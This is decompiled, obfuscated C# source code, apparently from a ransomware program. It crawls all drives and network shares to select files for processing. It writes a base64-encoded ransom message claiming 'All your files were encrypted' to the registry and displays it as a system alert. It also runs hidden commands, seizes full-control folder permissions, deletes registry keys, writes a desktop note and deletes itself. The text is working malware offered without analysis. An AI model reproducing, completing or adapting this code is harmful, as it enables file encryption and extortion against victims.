				if (!text.Contains(getString_0(107367958)) && !text.Contains(getString_0(107367933)) && !text.Contains(getString_0(107367900)) && !text.ToLower().Contains(getString_0(107367915)) && !text.ToLower().Contains(getString_0(107367870)) && !text.Contains(getString_0(107367877)) && !text.Contains(getString_0(107367856)) && !text.ToLower().Contains(getString_0(107367843)) && !text.ToLower().Contains(getString_0(107367798)) && !text.ToLower().Contains(getString_0(107367249)) && !text.ToLower().Contains(getString_0(107367272)) && !text.ToLower().Contains(getString_0(107367223)) && !text.ToLower().Contains(getString_0(107367242)) && !text.ToLower().Contains(getString_0(107367197)) && !text.ToLower().Contains(getString_0(107367208)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107367183)) && !fileInfo.FullName.Contains(getString_0(107367134)) && !fileInfo.FullName.Contains(getString_0(107367149)) && !fileInfo.FullName.Contains(getString_0(107367100)) && !fileInfo.FullName.Contains(getString_0(107367115)) && !fileInfo.FullName.Contains(getString_0(107367066)) && !fileInfo.FullName.Contains(getString_0(107367081)) && !fileInfo.FullName.Contains(getString_0(107367032)) && !fileInfo.FullName.Contains(getString_0(107367051)) && !fileInfo.FullName.Contains(getString_0(107367510)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367529)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367484)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367499)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367450)) && !fileInfo.FullName.Contains(DRlXtEGdcAr(getString_0(107367465))) && !fileInfo.FullName.Contains(getString_0(107367440)) && !fileInfo.FullName.Contains(getString_0(107367427)) && !fileInfo.FullName.Contains(getString_0(107367378)) && !fileInfo.FullName.EndsWith(getString_0(107412051)) && !fileInfo.FullName.EndsWith(getString_0(107367353)) && !fileInfo.FullName.EndsWith(getString_0(107367348)) && !fileInfo.FullName.EndsWith(getString_0(107367375)) && !fileInfo.FullName.EndsWith(getString_0(107367370)) && !fileInfo.FullName.Contains(getString_0(107367365)) && !fileInfo.FullName.Contains(eUsvqxZnDWYVdQ) && !fileInfo.FullName.Contains(GqXvKuGfqke) && !fileInfo.FullName.Contains(TajfgxbHDQDsSZ))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(UZIiquGHnbBZH) * 1024.0 * 1024.0 && vwwbhwOABO == getString_0(107396727))
						{
							list.Add(fileInfo.FullName);
							MDMoTszPlPyHagPb(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && vwwbhwOABO == getString_0(107397156))
						{
							list.Add(fileInfo.FullName);
							MDMoTszPlPyHagPb(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void TWDqJQgPDAdnhm()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107367316));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!vjXOwyOsZFHuY.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107366751), getString_0(107397161)).Replace(getString_0(107366746), getString_0(107366751))
					.Replace(getString_0(107366737), getString_0(107368489))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					vjXOwyOsZFHuY.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107366751), getString_0(107397161)).Replace(getString_0(107366746), getString_0(107366751))
						.Replace(getString_0(107366737), getString_0(107368489))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107366764), getString_0(107368489)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string VKiZFXRXdSmDy(string XrhKUnmEcXeC = "", string FEBfVOzkbhtvs = "")
	{
		string result = getString_0(107368489);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = XrhKUnmEcXeC,
				Arguments = FEBfVOzkbhtvs,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void aoDrPiciJh(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107366755),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string XVYVEQqAqPwoG(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string DRlXtEGdcAr(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void pWReIVPfsuQaOX(string UoTdohKUWyic = "", string WPBNvDpMDnqnX = "SW5mb3JtYXRpb24uLi4=", string HqoeFFzBFLb = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		UoTdohKUWyic = XVYVEQqAqPwoG(getString_0(107366706));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(UoTdohKUWyic), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(DRlXtEGdcAr(getString_0(107366609)), DRlXtEGdcAr(WPBNvDpMDnqnX));
				registryKey.SetValue(DRlXtEGdcAr(getString_0(107366608)), DRlXtEGdcAr(HqoeFFzBFLb));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			UoTdohKUWyic = XVYVEQqAqPwoG(getString_0(107366547));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(UoTdohKUWyic), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(DRlXtEGdcAr(getString_0(107366986)), DRlXtEGdcAr(WPBNvDpMDnqnX));
				registryKey.SetValue(DRlXtEGdcAr(getString_0(107366953)), DRlXtEGdcAr(HqoeFFzBFLb));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void cBAbybSoLrvK()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (pdgCKKhrrBHZnX == getString_0(107396727) && !string.IsNullOrEmpty(jmjaTLfeuxPg) && !string.IsNullOrEmpty(lTtDZSKOub))
				{
					pWReIVPfsuQaOX(getString_0(107368489), jmjaTLfeuxPg, lTtDZSKOub);
				}
				else
				{
					pWReIVPfsuQaOX(getString_0(107368489), getString_0(107368414), getString_0(107368417));
				}
			}
		}
		catch
		{
		}
	}

	public static void rAeJOuWancoBj(string xXZZEcqmKzGBko = "SW5mb3JtYXRpb24uLi4=", string kzTJpkSERgo = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(DRlXtEGdcAr(xXZZEcqmKzGBko));
		val.set_BalloonTipText(DRlXtEGdcAr(kzTJpkSERgo));
		val.ShowBalloonTip(30000);
	}

	public static void BvCtAHIesjG(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107366924)), getString_0(107366875) + text + getString_0(107366866) + string_0);
	}

	private static void ADQHxGJJJKSlJb()
	{
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Expected O, but got Unknown
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		AkOFMFjvEaUe();
		List<UaJLsokiltHx> list = UaJLsokiltHx.lmcxFlNYWUjqU();
		foreach (UaJLsokiltHx item in list)
		{
			LQjZyQoCuAgVY.Add(item.IPAddress);
		}
		List<string> lQjZyQoCuAgVY = LQjZyQoCuAgVY;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				CNuQcpTYjrLDCL CS_0024_003C_003E8__locals0 = new CNuQcpTYjrLDCL();
				CS_0024_003C_003E8__locals0.CsXsTwSZWKw = string_0;
				if ((!CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461329)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461356)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461347)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461302))) || !HSPEpTDPLKNFw.PHPWDFfcULSK(CS_0024_003C_003E8__locals0.CsXsTwSZWKw))
				{
					return;
				}
				try
				{
					Thread.Sleep(rrxeEOhCBbfFLgvV);
					vjXOwyOsZFHuY.Add(getString_0(107366751) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + getString_0(107461325));
					try
					{
						if (IrtcteVbDJMbKD)
						{
							Console.WriteLine(getString_0(107366751) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + getString_0(107461325));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(rrxeEOhCBbfFLgvV);
						vjXOwyOsZFHuY.Add(CNuQcpTYjrLDCL.getString_0(107366757) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + CNuQcpTYjrLDCL.getString_0(107397167) + (char)int_0 + CNuQcpTYjrLDCL.getString_0(107477696));
						try
						{
							if (IrtcteVbDJMbKD)
							{
								Console.WriteLine(CNuQcpTYjrLDCL.getString_0(107366757) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + CNuQcpTYjrLDCL.getString_0(107397167) + (char)int_0 + CNuQcpTYjrLDCL.getString_0(107477696));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(lQjZyQoCuAgVY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			if (IrtcteVbDJMbKD)
			{
				Console.WriteLine(getString_0(107366893));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = XVYVEQqAqPwoG(getString_0(107366547));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(DRlXtEGdcAr(getString_0(107366852)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(DRlXtEGdcAr(getString_0(107366795)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KxRJFZSBGpiT == getString_0(107396727))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107366206), getString_0(107366197));
				File.WriteAllText(text, DRlXtEGdcAr(getString_0(107366220)), Encoding.ASCII);
				VKiZFXRXdSmDy(getString_0(107397119), getString_0(107365134) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107365129))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107365129)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107365088))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107365088)));
				}
			}
			catch
			{
			}
		}
		try
		{
			if (IrtcteVbDJMbKD)
			{
				Console.WriteLine(getString_0(107365079));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107367316));
		ManagementObjectEnumerator enumerator2 = val.Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator2.get_Current();
				if (vjXOwyOsZFHuY.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107366751), getString_0(107397161)).Replace(getString_0(107366746), getString_0(107366751))
					.Replace(getString_0(107366737), getString_0(107368489))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (IrtcteVbDJMbKD)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107366751), getString_0(107397161)).Replace(getString_0(107366746), getString_0(107366751))
							.Replace(getString_0(107366737), getString_0(107368489))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107366764), getString_0(107368489)));
					}
				}
				catch
				{
				}
				vjXOwyOsZFHuY.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107366751), getString_0(107397161)).Replace(getString_0(107366746), getString_0(107366751))
					.Replace(getString_0(107366737), getString_0(107368489))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107366764), getString_0(107368489)));
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		try
		{
			if (IrtcteVbDJMbKD)
			{
				Console.WriteLine(getString_0(107365022));
			}
		}
		catch
		{
		}
	}

	public static bool qrNfhlFPRfzWk()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107365465));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void mNXtAeoohfKy(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = DRlXtEGdcAr(getString_0(107365432));
		processStartInfo.Arguments = getString_0(107365403) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool sdtISqUteMHp(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ELdWbhsaMkLN(string string_0)
	{
		try
		{
			vXvytLZhsEJ CS_0024_003C_003E8__locals0 = new vXvytLZhsEJ();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.vmEzHwsOBXJew = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.vmEzHwsOBXJew);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107365398);
		}
		catch
		{
			return false;
		}
	}

	public static string DaNjtiFanUZ(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void wfwltMFpsA()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = XVYVEQqAqPwoG(getString_0(107365421));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107365283)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107365258)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364697)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364672)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107365432)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364679)));
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107366924)));
					registryKey.Close();
				}
				string_ = XVYVEQqAqPwoG(getString_0(107364650));
				registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364553)));
					registryKey.Close();
				}
				string_ = XVYVEQqAqPwoG(getString_0(107364504));
				registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364553)));
					registryKey.Close();
				}
				string_ = XVYVEQqAqPwoG(getString_0(107364504));
				registryKey = Registry.CurrentUser.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(DRlXtEGdcAr(getString_0(107364553)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107364519)), DRlXtEGdcAr(getString_0(107364470)));
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107364965)), DRlXtEGdcAr(getString_0(107364924)));
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107364965)), DRlXtEGdcAr(getString_0(107364810)));
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107364749)), DRlXtEGdcAr(getString_0(107462492)));
		}
		catch
		{
		}
	}

	public static void jIMiBnTvhHRYVy(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(DRlXtEGdcAr(getString_0(107462419)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void QdGFDEFkCBx()
	{
		string string_ = XVYVEQqAqPwoG(getString_0(107462394));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(DRlXtEGdcAr(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(DRlXtEGdcAr(getString_0(107462345)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void AkOFMFjvEaUe()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107462312)), DRlXtEGdcAr(getString_0(107462267)));
			VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107462312)), DRlXtEGdcAr(getString_0(107462649)));
		}
	}

	public static void qWuBXxnBId()
	{
		VKiZFXRXdSmDy(getString_0(107397119), DRlXtEGdcAr(getString_0(107462535)));
		string text = DRlXtEGdcAr(getString_0(107461829));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107366737) + text + getString_0(107366737) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397119);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void zUUGKqROIrsY(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(GqXvKuGfqke, getString_0(107461764) + string_0 + getString_0(107462235) + ex.Message + getString_0(107396410));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string MobVTSLPgWz()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107368489);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107462178);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107462169))) ? getString_0(107462183) : getString_0(107462192));
				break;
			case 0:
				text = getString_0(107462174);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107462141);
				break;
			case 4:
				text = getString_0(107462160);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107462110) : getString_0(107462151));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107462123) : getString_0(107396495)) : getString_0(107462128)) : getString_0(107462105));
				break;
			case 10:
				text = getString_0(107462118);
				break;
			}
		}
		if (text != getString_0(107368489))
		{
			text = getString_0(107462113) + text;
			if (oSVersion.ServicePack != getString_0(107368489))
			{
				text = text + getString_0(107366866) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string jHFPZVFjoxP(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107412037);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107412004)));
				streamWriter.WriteLine(getString_0(107396410));
				streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107407194)));
				streamWriter.WriteLine(string_0);
				if (JaGTzvkqDZS)
				{
					streamWriter.WriteLine(getString_0(107396410));
					streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107407116)));
					streamWriter.WriteLine(XCKLADindvJZ.zhDvisqDYmjg());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !DfXjMyctTQk)
				{
					File.AppendAllText(text, getString_0(107407083) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(GqXvKuGfqke, getString_0(107462068) + ex.Message + getString_0(107396410));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void rPrefpPNnAJc(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		KMJjgTaGyGoI.gzJfwJMzEav CS_0024_003C_003E8__locals0 = new KMJjgTaGyGoI();
		CS_0024_003C_003E8__locals0.FNIjUNNqXwdHj = string_1;
		CS_0024_003C_003E8__locals0.IqyilbKzVoAwTbE = string_2;
		CS_0024_003C_003E8__locals0.nYKOUovRNfx = string_3;
		CS_0024_003C_003E8__locals0.qBauyXNikmMNt = string_4;
		fDTUzhDlmgg = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nYKOUovRNfx);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396658))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !vjXOwyOsZFHuY.Contains(array[i].Name))
					{
						vjXOwyOsZFHuY.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!vjXOwyOsZFHuY.Contains(string_0[j]))
				{
					vjXOwyOsZFHuY.Add(string_0[j]);
				}
			}
		}
		if (vjXOwyOsZFHuY.Contains(DRlXtEGdcAr(getString_0(107462011))) && dMyOPFWbNnAP == getString_0(107396727))
		{
			vjXOwyOsZFHuY.Remove(DRlXtEGdcAr(getString_0(107462011)));
		}
		Parallel.ForEach(vjXOwyOsZFHuY, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new KMJjgTaGyGoI.gzJfwJMzEav();
			CS_0024_003C_003E8__locals0.klsDNztoYXkfr = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.wxjjxOOOHenrc = string_0;
			if (cgnsxMDVCroTQ && !MobVTSLPgWz().Contains(KMJjgTaGyGoI.getString_0(107462122)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						sdtISqUteMHp(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.wxjjxOOOHenrc);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uUqSvzVKAfyGAz == KMJjgTaGyGoI.getString_0(107396739))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OQIlzgdLGaTrUDu(CS_0024_003C_003E8__locals0.wxjjxOOOHenrc, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.FNIjUNNqXwdHj, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.qBauyXNikmMNt, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.IqyilbKzVoAwTbE, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.nYKOUovRNfx);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				OQIlzgdLGaTrUDu(CS_0024_003C_003E8__locals0.wxjjxOOOHenrc, CS_0024_003C_003E8__locals0.FNIjUNNqXwdHj, CS_0024_003C_003E8__locals0.qBauyXNikmMNt, CS_0024_003C_003E8__locals0.IqyilbKzVoAwTbE, CS_0024_003C_003E8__locals0.nYKOUovRNfx);
			}
		});
	}

	public static void OQIlzgdLGaTrUDu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107368489));
		List<string> list3 = list2;
		if (VBShylEsNUYfMi == getString_0(107397156))
		{
			if (FFKPaIgUHZxbh == getString_0(107396727) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ELdWbhsaMkLN(string_0))
			{
				YkBHONCwBUd ykBHONCwBUd = null;
				try
				{
					ykBHONCwBUd = new YkBHONCwBUd(string_0.Replace(getString_0(107397161), getString_0(107368489)));
				}
				catch
				{
					list = IsaIYwLIDjd(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					MDMoTszPlPyHagPb(ykBHONCwBUd.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = IsaIYwLIDjd(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = IsaIYwLIDjd(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = AwqBWeKIscu.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0458;
					}
				}
				if ((wqbriLFZDnLpH == getString_0(107397156) && !item.EndsWith(text)) || UdjWdPcrsN.Contains(item))
				{
					continue;
				}
				if (xfkNWisgyvAPU == getString_0(107396727))
				{
					try
					{
						if (WYJTdIPbblX.TSIXTbBLjVAFJe(item))
						{
							WYJTdIPbblX.miTLgtFrOVP(item);
						}
					}
					catch
					{
					}
				}
				UdjWdPcrsN.Add(item);
				if (!nfYRZbrPjpWWw.Contains(Path.GetDirectoryName(item)))
				{
					nfYRZbrPjpWWw.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
